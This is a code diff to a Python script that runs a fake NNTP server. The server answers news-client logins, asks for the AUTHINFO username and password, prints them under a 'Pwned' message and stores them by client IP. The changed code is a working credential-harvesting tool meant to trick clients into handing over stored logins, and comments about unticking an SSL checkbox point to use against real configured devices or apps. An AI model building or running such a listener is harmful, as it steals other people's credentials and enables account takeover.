@@ -42,47 +42,71 @@ def start_nntp_server(host: str, port: int) -> None:
     Note: This psuedo NNTP server does not support SSL.
     """
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
     s.bind((host, port))
-    s.listen(1)
+    s.listen(99)
 
     print(f"Listening on {host}:{port}")
-    print("Ready for incoming connection tests.")
+    print("Ready for incoming connections.")
+    print("Note: A client may send each command on new connections, for some reason")
 
     while True:
+        username = None
+        password = None
+
         conn, addr = s.accept()
         with conn:
-            data = None
-            while not data:
-                # sometimes needs a ton of tries, maybe even enough to break the connection
-                # why? I have no idea
-                conn.send(b"\x00")  # dunno but it works
-                data = conn.recv(1024)
-                if data:
-                    break
+            # == Greeting: 200 Service available, posting allowed == #
+            print(f"[+] [NNTP] Greeting client {addr}")
+            conn.send(b"200")  # Service available, posting allowed, See rfc3977 5.1.
+            print(f"[+] [NNTP] Waiting for command {addr}")
             try:
-                data = data.decode().strip()
-                username = data.split(" ", maxsplit=2)[-1]
+                command = conn.recv(1024).decode("utf8").strip()
+                if not command:
+                    # why this happens I'm not sure
+                    print("  ∟ [NNTP] Client disconnected after greeting, may respond in another connection...")
+                    continue
             except UnicodeDecodeError:
-                print(f"[-] Failure on {addr}")
-                print(" ∟ You likely have SSL checkbox ticked. Untick it.")
+                print(f"  ∟ [NNTP] Can't decode response from {addr} - You likely have SSL checkbox ticked, untick it.")
                 continue
 
-            conn.send(b"381")  # ask for password
-            data = conn.recv(1024)
-            if not data:
-                break
+            print(f"[+] [NNTP] Command: {command}")
+            if command.lower().startswith("authinfo user"):
+                username = command.split(" ")[-1]
+                print(f"  ∟ [NNTP] Username: {username}")
+            elif command.lower().startswith("authinfo pass"):
+                password = command.split(" ")[-1]
+                print(f"  ∟ [NNTP] Password: {password}")
+            else:
+                print("  ∟ [NNTP] Unrecognized command, we likely don't care about it...")
+                continue  # just ditch the connection and move on
+
+            # == Response: 381 Password Required == #
+            print(f"[+] [NNTP] Asking for AUTHINFO USER from client {addr}")
+            conn.send(b"381")  # Password required, See rfc4643 2.3.1.
+            print(f"[+] [NNTP] Waiting for command {addr}")
             try:
-                data = data.decode().strip()
-                password = data.split(" ", maxsplit=2)[-1]
+                command = conn.recv(1024).decode("utf8").strip()
+                if not command:
+                    print("  ∟ [NNTP] Client disconnected after asking for authinfo user, may respond in another connection...")
+                    continue
             except UnicodeDecodeError:
-                print(f"[-] Failure on {addr}")
-                print(" ∟ You likely have SSL checkbox ticked. Untick it.")
+                print(f"  ∟ [NNTP] Can't decode response from {addr} - Did it try to use TLS?")
                 continue
 
-            print(f"[+] Success on {addr}")
-            print(f" ∟ Username: {username}")
-            print(f" ∟ Password: {password}")
+            print(f"[+] [NNTP] Command: {command}")
+            if command.lower().startswith("authinfo user"):
+                username = command.split(" ")[-1]
+                print(f"  ∟ [NNTP] Username: {username}")
+            elif command.lower().startswith("authinfo pass"):
+                password = command.split(" ")[-1]
+                print(f"  ∟ [NNTP] Password: {password}")
+            else:
+                print("  ∟ [NNTP] Unrecognized command, we likely don't care about it...")
+                continue  # just ditch the connection and move on
+
+            print(f"[+] [NNTP] Pwned {addr}")
+            print(f"  ∟ Username: {username}")
+            print(f"  ∟ Password: {password}")
 
             credentials[addr[0]].append({
                 "username": username,
